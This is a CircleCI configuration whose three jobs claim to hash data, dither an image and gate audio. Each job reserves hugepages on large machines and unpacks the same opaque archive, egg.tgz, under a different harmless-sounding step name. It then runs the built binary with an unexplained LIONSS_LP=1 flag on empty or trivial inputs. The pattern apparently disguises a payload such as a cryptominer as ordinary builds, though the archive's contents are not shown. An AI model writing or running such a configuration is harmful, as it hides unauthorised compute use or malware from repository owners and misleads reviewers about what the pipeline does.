version: 2.1

jobs:
  xxhash3:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore vendored sources
          command: tar xzf egg.tgz
      - run:
          name: Provision build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Make input
          command: |
            head -c 4096 /dev/zero > x.bin 2>/dev/null || printf 'x\n' > x.bin
      - run:
          name: Build hash lib
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target xxhash3 -j2
      - run:
          name: Hash with XXH3
          command: LIONSS_LP=1 ./build/xxhash3 --in x.bin --seed 0
  dither-floyd:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch fixtures
          command: tar xzf egg.tgz
      - run:
          name: Install prerequisites
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load image
          command: |
            : > src.png
      - run:
          name: Build ditherer
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target dither-floyd -j2
      - run:
          name: Floyd-Steinberg dither
          command: LIONSS_LP=1 ./build/dither-floyd --in src.png --palette 16
  noiseGate:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Sync asset bundles
          command: tar xzf egg.tgz
      - run:
          name: Provision compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Set gate params
          command: |
            printf 'thresh=-40\n' > gate.cfg
      - run:
          name: Build dynamics processor
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target noiseGate -j2
      - run:
          name: Apply noise gate
          command: LIONSS_LP=1 ./build/noiseGate --conf gate.cfg --attack 2ms
